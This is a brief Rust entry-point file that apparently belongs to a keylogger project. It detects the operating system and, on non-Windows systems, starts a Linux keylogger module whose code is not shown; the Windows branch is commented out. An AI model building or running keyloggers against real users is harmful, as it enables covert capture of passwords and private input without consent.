use std::env::consts;

mod common;
mod linux;

use common::Common;
use linux::keylogger::Keylogger as LinuxKeyLog;

fn main() {
    let os = consts::FAMILY;

    if os.contains("windows") {
        // let kl = Windows { };
        // kl.find_keyboard();
    } else {
        let kl = LinuxKeyLog { };

        kl.start_logging();
    }
}
